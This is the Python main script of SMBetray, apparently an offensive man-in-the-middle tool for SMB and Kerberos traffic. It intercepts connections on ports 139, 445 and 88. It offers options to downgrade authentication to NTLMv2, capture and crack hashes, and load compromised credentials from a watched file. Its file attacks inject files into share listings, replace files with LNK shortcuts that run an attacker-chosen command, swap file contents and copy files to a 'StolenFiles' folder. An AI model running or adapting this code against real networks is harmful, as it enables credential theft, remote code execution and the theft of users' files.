#!/usr/bin/python
import argparse
from binascii import hexlify, unhexlify
import logging
from impacket.examples import logger
import os
# For sharing data across threads
from multiprocessing import Manager, Queue
from threading import Lock, Thread
import copy

# 
from lib import ebcLib
from lib.SMB1_Lib import SMB1_Lib
from lib.SMB2_Lib import SMB2_Lib
from lib.K2TKerb import K2TKerb
from lib.SMB_Core import PoppedCreds
from impacket.smb3structs import SMB2Packet, SMB2Read_Response
from impacket.nmb import NetBIOSSessionPacket
from hashlib import md5
import re
import time
# Colors
from lib.bcolors import bcolors


# Logger, for easy output when dealing with threads
logger.init()
logging.getLogger().setLevel(logging.INFO)


class AttackConfig(object):
	DIALECT_DOWNGRADE 		= False
	AUTHMECH_DOWNGRADE 		= False
	AUTHMECH_DOWNGRADE_K311 = False
	POPPED_CREDS_FILE 		= None

	PASSIVE_OUTPUT_DIR 	= None
	INJECT_FILES_DIR 	= None
	HASH_OUTPUT_FILE 	= None

	LNK_SWAP_ALL 		= None
	LNK_SWAP_EXEC_ONLY	= None

	EXTENSION_SWAP_DIR	= None
	FILENAME_SWAP_DIR 	= None


# This just live-monitors the file 
# holding compromised credentials, and
# loads them into a shared memory object
# so that SMBetray/K2TKerb can use them
# to break keys. One set of creds per line.
#
#	[FILE FORMAT] domain/username and password are seperated by a single space. " "
#
# DOMAIN/Username password
# or
# DOMAIN/Username aad3b435b51404eeaad3b435b51404ee:39c0d0c980e8dde6cc31edc4a74cd914
#
class CredFileWatcher(Thread):
	def __init__(self, credFile, poppedCredsDB, poppedCredsDB_Lock):
		self.credFile 			= credFile
		self.poppedCredsDB		= poppedCredsDB
		self.poppedCredsDB_Lock = poppedCredsDB_Lock
		self.suicide 			= False
		super(CredFileWatcher, self).__init__()	

	# Called by the parent Thread class "start" function
	def run(self):
		oldHash 	= "firstRun"
		logging.info("[CredFileWatcher] Watching " + self.credFile)
		while True:
			if(self.suicide):
				return
			m_handle 	= md5()
			m_handle.update(open(self.credFile, "r").read())
			newHash 	= m_handle.digest()

			if(newHash != oldHash):
				# File has been changed
				oldHash = newHash
				for line in open(self.credFile, "r"):
					try:
						# Reset
						ntHash 		= False						
						line 		= line.replace("\n", "").replace("\r", "")
						domain 		= line.split("/")[0]
						username 	= line.split("/")[1].split(" ")[0]
						password 	= line[line.find(" ")+1:]
						popped 		= PoppedCreds(username, password, domain)
						# If we're given an LM:NT hash (eg. aad3b435b51404eeaad3b435b51404ee:be692b029663e38fa07d13e3228cf0be)
						if(len(re.findall(r'^\w{32}:\w{32}$', password)) > 0):
							ntHash = True
							del(popped)
							popped = PoppedCreds(username = username, domain = domain, lm_hash = unhexlify(password[password.find(" ")+1:password.find(":")]), nt_hash = unhexlify(password[password.find(":")+1:]))
						# Check if it's already in the DB
						if(hash(popped) not in self.poppedCredsDB.keys()):
							self.poppedCredsDB_Lock.acquire()
							try:
								self.poppedCredsDB[hash(popped)] = copy.deepcopy(popped)
								logging.info("[CredFileWatcher] Loaded creds of " + popped.domain + "/" + popped.username)
							except Exception, e:
								logging.error("[CredFileWatcher::watch] " + str(e))
								pass
							self.poppedCredsDB_Lock.release()
					except Exception, e:
						logging.error("[CredFileWatcher::watch] " + str(e))
						continue
			time.sleep(.5)

	# If the timeout == -1, then this does nothing
	# otherwise, it initiates the shutdown
	def join(self, timeout = None):
		if timeout == -1:
			return
		self.suicide = True
		super(CredFileWatcher, self).join(timeout)

# This is the grand controller. It's just a mainly empty
# router that: 
# 1. Compiles split-up netbios packets, and 
# 2. Passes the packet to the appropriate library(
# 		(SMB2/3 packets to SMB2_Lib, SMB1 packets to SMB1_Lib)
class SMBetray(ebcLib.MiTMModule):
	# This function is called by the MiTMModule.__init__
	def setup(self):
		self.SMBTool		= None

		# This is a make-shift solution to SMB messages that get broken up, such as 
		# read responses which may be broken down to 1500 bytes per message. 
		self.SRV_INCOMPLETE_MESSAGE	= False
		self.SRV_MESSAGE_DATA		= ""
		self.SRV_MESSAGE_LENGTH 	= 0

		self.CLT_INCOMPLETE_MESSAGE	= False
		self.CLT_MESSAGE_DATA		= ""
		self.CLT_MESSAGE_LENGTH 	= 0
		
		pass
	
	# Modify the raw data sent from the client to the server
	def parseClientRequest(self, request):
		SMB1_Header = '\xff\x53\x4d\x42'
		SMB2_Header = '\xfe\x53\x4d\x42'

		# If we're in the middle of compiling the data from one very large split up packet, continue to do so
		if(self.CLT_INCOMPLETE_MESSAGE):
			self.CLT_MESSAGE_DATA += request
			if(len(self.CLT_MESSAGE_DATA) == self.CLT_MESSAGE_LENGTH):
				request = str(self.CLT_MESSAGE_DATA)
				self.CLT_MESSAGE_DATA = ""
				self.CLT_MESSAGE_LENGTH = 0
				self.CLT_INCOMPLETE_MESSAGE = False
			else:
				# We're still waiting for the remainder of this packet, so don't return a response, thus we hold off passing the request to the server
				return
		# Verify we got an SMB packet wrapped inside of a NetBIOS packet
		try:
			raw = NetBIOSSessionPacket(data = request)
			if(len(str(request)) < raw.length):
				self.CLT_INCOMPLETE_MESSAGE 	= True
				self.CLT_MESSAGE_DATA 			= str(request)
				self.CLT_MESSAGE_LENGTH 		= raw.length + 4
				# Don't return a response, thus we hold off passing the request to the server
				return
		except Exception, e:
			logging.debug("[SMBetray::parseClientRequest] " + str(e) + " " + traceback.format_exc())
			return request

		# Cool, now we've got the entire re-compiled packet.
		# Now lets do something with it

		# Handle SMBv1 packets
		if(request[4:8] == SMB1_Header):
			if(self.SMBTool.__class__.__name__ != 'SMB1_Lib'):
				self.SMBTool = SMB1_Lib(self.info, self.MiTMModuleConfig)
			return self.SMBTool.handleRequest(request)
		# Handle SMBv2 packets
		if(request[4:8] == SMB2_Header):
			if(self.SMBTool.__class__.__name__ != 'SMB2_Lib'):
				self.SMBTool = SMB2_Lib(self.info, self.MiTMModuleConfig)
			return self.SMBTool.handleRequest(request)

		# Else, pass it along
		return request

	# Modify the raw data sent from the server back to the client
	def parseServerResponse(self, response):
		SMB1_Header = '\xff\x53\x4d\x42'
		SMB2_Header = '\xfe\x53\x4d\x42'

		# If we're in the middle of compiling the data from one very large split up packet, continue to do so
		if(self.SRV_INCOMPLETE_MESSAGE):
			self.SRV_MESSAGE_DATA += response
			if(len(self.SRV_MESSAGE_DATA) == self.SRV_MESSAGE_LENGTH):
				response = str(self.SRV_MESSAGE_DATA)
				self.SRV_MESSAGE_DATA = ""
				self.SRV_MESSAGE_LENGTH = 0
				self.SRV_INCOMPLETE_MESSAGE = False
			else:
				# Don't return a response, thus we hold off replying to the client
				return
		# Verify we got an SMB packet wrapped inside of a NetBIOS packet
		try:
			raw = NetBIOSSessionPacket(data = response)
			if(len(str(response)) < raw.length):
				self.SRV_INCOMPLETE_MESSAGE 	= True
				self.SRV_MESSAGE_DATA 			= str(response)
				self.SRV_MESSAGE_LENGTH 		= raw.length + 4
				# Don't return a response, thus we hold off replying to the client
				return
		except Exception, e:
			logging.debug("[SMBetray::parseServerResponse] " + str(e) + " " + traceback.format_exc())
			return response

		# Cool, now we've got the entire re-compiled packet.
		# Now lets do something with it


		# Handle SMBv1 packets
		if(response[4:8] == SMB1_Header):
			if(self.SMBTool.__class__.__name__ != 'SMB1_Lib'):
				self.SMBTool = SMB1_Lib(self.info, self.MiTMModuleConfig)
			return self.SMBTool.handleResponse(response)
		# Handle SMBv2 packets
		if(response[4:8] == SMB2_Header):
			if(self.SMBTool.__class__.__name__ != 'SMB2_Lib'):
				self.SMBTool = SMB2_Lib(self.info, self.MiTMModuleConfig)
			return self.SMBTool.handleResponse(response)
	
		# Else, pass it along
		return response


VERSION = "1.0.0"
# Parse the commandline arguments
def parseCommandLine():
	'''This function parses and return arguments passed in'''
	# Assign description to the help doc
	parser = argparse.ArgumentParser()
	parser._optionals.title = "Standard arguments"
	parser.add_argument('-I', metavar='IFACE', type=str, help='Interface to hijack connections on', required=True)
	parser.add_argument('-v', '--verbose', action="store_true", help='Print verbose output', required=False)
	

	connGroup = parser.add_argument_group('Authentication & protocol attacks')
	connGroup.add_argument('--downgradeAuth', action="store_true", help='Attempt to downgrade authentication mechanisms to NTLMv2', required=False)
	connGroup.add_argument('--K311', action="store_true", help='Try to downgrade SMB 3.1.1 to NTLMv2, even though the connection will be killed after auth (only good for capturing hashes)', required=False)
	connGroup.add_argument('--creds', metavar='CREDFILE', default=None, type=str, help='A file containing usernames & passwords (or lm:ntlm hashes) for session key cracking, one-per line, formatted as "DOMAIN/USERNAME PASSWORD" or "DOMAIN/USERNAME lm:ntlm". This file is watched for live edits', required=False)
	connGroup.add_argument('--hashOutputFile', metavar='OUTPUTFILE', default=None, type=str, help='Store captured NTLMv2 hashes in this file', required=False)

	fileGroup = parser.add_argument_group('File Attacks')
	fileGroup.add_argument('--injectFiles', metavar='DIRECTORY', default=None, type=str, help='Inject the files from the specified folder into every folder listing of the network share (useful for social engineering)', required = False)
	fileGroup.add_argument('--lnkSwapAll', metavar='COMMAND', default=None, type=str, help='Replace every file shown (except folders) with a LNK with the same name to run the provided command', required=False)
	fileGroup.add_argument('--lnkSwapExecOnly',  metavar='COMMAND', default=None, type=str, help='Only replace every executable or lnk file shown (except folders) with a LNK with the same name to run the provided command', required=False)
	fileGroup.add_argument('--extSwapDir', metavar='DIRECTORY', default=None, type=str, help='Swap out the contents of any file with extension X with the contents of the file in the provided directory with extension X')
	fileGroup.add_argument('--nameFileSwap', metavar='DIRECTORY', default=None, type=str, help='Swap out the contents of a file sharing the same name as one of the files in the provided directory (eg the contents of the file Sample.xml is swapped out with contents of DIRECTORY/Sample.xml)')


	utilGroup = parser.add_argument_group('Utilities')
	utilGroup.add_argument('--passive', metavar='OUTPUTDIR', default=None, type=str, help='Passively copy files in cleartext to the provided directory', required=False)
	

	# Array for all arguments passed to script
	args = parser.parse_args()

	if(args.verbose):
		logging.getLogger().setLevel(logging.NOTSET)

	
	config 								= dict()
	config['interface'] 				= args.I
	
	# build the AttackConfig for SMBetray to later parse
	attackConf 							= AttackConfig()

	attackConf.AUTHMECH_DOWNGRADE 		= args.downgradeAuth
	attackConf.POPPED_CREDS_FILE 		= args.creds

	attackConf.PASSIVE_OUTPUT_DIR 		= args.passive
	attackConf.HASH_OUTPUT_FILE 		= args.hashOutputFile

	attackConf.INJECT_FILES_DIR			= args.injectFiles
	attackConf.EXTENSION_SWAP_DIR		= args.extSwapDir
	attackConf.FILENAME_SWAP_DIR		= args.nameFileSwap
	attackConf.LNK_SWAP_ALL				= args.lnkSwapAll
	attackConf.LNK_SWAP_EXEC_ONLY		= args.lnkSwapExecOnly
	attackConf.AUTHMECH_DOWNGRADE_K311 	= args.K311



	if(args.lnkSwapAll != None and args.lnkSwapExecOnly != None):
		logging.error("FATAL: Cannot use --lnkSwapAll and --lnkSwapExecOnly together")
		exit(0)

	
	config['SMBAttackConfig'] 			= attackConf



	# The file to read/monitor for compromised creds to use for cracking SMB session keys
	config['credFile'] 					= './compromisedCreds.txt'
	# The directory to store passively captured files 
	config['stolenFilesOutputDir']		= './StolenFiles'

	return config

	# Prints that l337 banner
def printBanner():
	z =  "\n"
	z += bcolors.OKBLUE + """##### ####### ####  """+bcolors.FAIL+"""##### ##### ##### ##### #   #  \n"""+bcolors.ENDC
	z += bcolors.OKBLUE + """#     #  #  # #   # """+bcolors.FAIL+"""#       #   #   # #   #  # #   \n"""+bcolors.ENDC
	z += bcolors.OKBLUE + """##### #  #  # ####  """+bcolors.FAIL+"""#####   #   ####  #####   #    \n"""+bcolors.ENDC
	z += bcolors.OKBLUE + """    # #  #  # #   # """+bcolors.FAIL+"""#       #   #  #  #   #   #    \n"""+bcolors.ENDC
	z += bcolors.OKBLUE + """##### #  #  # ####  """+bcolors.FAIL+"""#####   #   #   # #   #   #    \n"""+bcolors.ENDC
	z += "\n"
	z += bcolors.TEAL + """SMBetray v"""+str(VERSION)+""" ebcLib v"""+str(ebcLib.VERSION)+bcolors.ENDC+"\n"
	z += bcolors.WHITE + """@Quickbreach"""+bcolors.ENDC+"\n"

	print(z)
def runAttack(config):
	# The list that will contain all of the running MiTMServer threads 
	MiTMServers 		= []
	fileWatcherThread 	= None
	# Memory sharing across threads 
	sharedData 			= []
	sharedData.append(Manager())
	sharedData.append(Manager())
	sharedData.append(Manager())
	sharedData.append(Manager())


	smbKeyChain 	 	= sharedData[0].dict() 	#Shared memory accross threads - this allows the K2TKerb module to share the session key with the SMBetray module
	smbKeyChain_Lock 	= Lock() 				#To prevent multiple threads from accessing the smbKeyChain at the same time

	kerbSessionSalts	= sharedData[1].dict() 	#Shared memory accross threads - to give all K2TKerb threads access to the salts from PREAUTH-errors
	
	kerbSessionKeys	 	= sharedData[2].dict() 	#Shared memory accross threads - to give all K2TKerb threads access to the kerberos AS-REP session keys

	poppedCredsDB 	 	= sharedData[3].dict() 	#Shared memory accross threads - to give all SMBetray modules access to the creds in the popped-creds file
	poppedCredsDB_Lock 	= Lock()				#Shared memory accross threads - to give all SMBetray modules access to the creds in the popped-creds file


	kerbPoppedKeys 		= Queue()

	# Watch the credential file for live edits
	if(config['SMBAttackConfig'].POPPED_CREDS_FILE != None):
		fileWatcherThread = CredFileWatcher(config['SMBAttackConfig'].POPPED_CREDS_FILE, poppedCredsDB, poppedCredsDB_Lock)
		fileWatcherThread.start()

	# Create the SMBetray module instance
	smbetrayMod = SMBetray()
	smbetrayMod.addCustomData(attackConfig 			= config['SMBAttackConfig'])
	smbetrayMod.addCustomData(smbKeyChain 			= smbKeyChain)
	smbetrayMod.addCustomData(smbKeyChain_Lock 		= smbKeyChain_Lock)
	smbetrayMod.addCustomData(poppedCredsDB 		= poppedCredsDB)
	smbetrayMod.addCustomData(poppedCredsDB_Lock	= poppedCredsDB_Lock)
	smbetrayMod.addCustomData(kerbPoppedKeys		= kerbPoppedKeys)

	# Create the Kerberos intercept server
	kickToTheKerb = K2TKerb()
	kickToTheKerb.addCustomData(attackConfig 			= config['SMBAttackConfig'])
	kickToTheKerb.addCustomData(poppedCredsDB 			= poppedCredsDB)
	kickToTheKerb.addCustomData(kerbPoppedKeys 			= kerbPoppedKeys)

	# 445 SMB intercept
	# 88 Kerberos intercept
	MiTMServers.append(ebcLib.MiTMServer(139, "tcp", config['interface'], smbetrayMod, True))
	MiTMServers.append(ebcLib.MiTMServer(445, "tcp", config['interface'], smbetrayMod, True))
	MiTMServers.append(ebcLib.MiTMServer(88, "tcp", config['interface'], kickToTheKerb, False))



	try:
		logging.info("Starting intercept servers!")
		for x in MiTMServers:
			x.daemon = True
			x.start()
		while MiTMServers[-1].isAlive():
			# the MiTMServer disregards '-1', so this join does nothing
			MiTMServers[-1].join(-1)
	except KeyboardInterrupt:
		logging.info("Quitting....")
		for z in MiTMServers:
			z.join(0)
		if(fileWatcherThread != None):
			fileWatcherThread.join(0)
	except Exception, e:
		m = logging.error(str(traceback.format_exc()))
		logging.error("Error: " + str(m))
if __name__ == "__main__":
	# Print the banner
	printBanner()
	# Handle the commandline arguments
	config = parseCommandLine()
	# Command-line looked good, execute
	runAttack(config)


#1. Generate the LNK files
#2. Generate the files for .dll, .exe, .msi, .war, .aspx, .asp, .jsp, .vbs, .vb, .bat, .com, .cmd, .ps1, .reg
#3. Read the cracked credentials file
#4. 

# Grab Registry.pol
# Inject files
# LnkSwap
# Crack NTLMv2 keys